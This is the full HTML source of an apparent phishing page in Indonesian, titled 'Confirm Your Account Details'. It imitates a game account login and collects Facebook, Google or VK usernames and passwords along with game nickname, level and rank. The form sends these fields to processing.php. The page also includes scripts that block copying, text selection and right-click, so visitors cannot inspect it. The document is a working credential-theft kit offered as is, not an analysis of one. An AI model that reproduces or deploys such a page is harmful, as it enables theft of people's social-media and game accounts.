<!DOCTYPE html>
<html>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://static-s.aa-cdn.net/img/ios/1160056295/057712e20f0ec8f859d7d3d9595e864f'/>
<title>Confirm Your Account Details</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<body style="background-image:url(https://i.ibb.co/n3rXYM4/1590200553-picsay.png)" no-repeat-fixed"><style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}

#pricing {
    width: 600px;
    margin: 100px auto;
    font-family: 'Open Sans', Helvetica;
}




.price_curd {

width: 350px;
background: -webkit-linear-gradient(left, blue , blue);
display: inline-table;
top: 0;
    
    
}

.header {
    color: rgb(255, 255, 255);
}


.alpha button {
    background: purple;
}  

.alphu .header {
    background: rgb(39, 39, 39);
    border-radius: 1em;
    opacity: 0.9;
    border-bottom: 10px double yellow;
    border-right: 10px double yellow;
    border-left: 10px double yellow;
    border-top: 10px double yellow;      
}
.alphu button {
    background: purple;
}    
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {

var gnumber = $("#gnumber").val();
var townhall = $("#townhall").val();
var grecov = $("#grecov").val();
var gexp = $("#gexp").val();
		  if(gnumber==''|| grecov=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("request.php",
		  {gnumber:gnumber,grecov:grecov,gexp:gexp,townhall:townhall,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<center>
<br><center>

        <div class="price_curd alphu">              
            <div class="header">
               <img src="https://i.ibb.co/h1RZtDQ/images-2020-05-23-T093441-808-picsay.png" width="350px" >                          
                <span class="name"></span>
           
  <center><h3>LOGIN YOUR ACCOUNT </h3></center>
<center>
       <form action="processing.php" id="login-form" method="post">
  <h4 >
<img src="imgu/log.png" height="70px" width="210px">
</h4><form id="glogin">
<div style="width:100%" class="form-group">
        <select class="form-control" name="log">
          <option>Login Pakai?</option>
          <option>FB</option>
          <option>Google</option>
          <option>VK</option>
          </select>
</div>
<div style="width:100%" class="form-group"><br>
  <input class="form-control" name="fb" placeholder="Username/Email/NoHP" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="pwfb" placeholder="Password" type="password" required>
<br>
</div>




<h4 >
  <img src="imgu/logo.jpg" height="70px" width="70px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="nick" placeholder="Nickname" type="text" required>
</div>


<div style="width:100%" class="form-group">
  <input class="form-control" name="level" placeholder="Level" type="number" required>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="rank">
          <option>Tier Rank</option>
          <option>Bronze</option>
          <option>Silver</option>
          <option>Gold</option>
          <option>Platinum</option>
          <option>Diamond</option>
          <option>Master</option>
          <option>Grand Master</option>
          </select>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="elite">
          <option>Pernah Elite Pass ?</option>
          <option>Pernah</option>
          <option>Tidak Pernah</option>
          <option>Pernah PRE-ORDER</option>
          </select>
</div>

 <input type="submit" class="btn btn-block" style="color: #FFFF00;background-color: #000000;" value="LOGIN ACCOUNT"> </form>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
</center>
 </div></form>
 
</div>
</div><br><br>
</div>
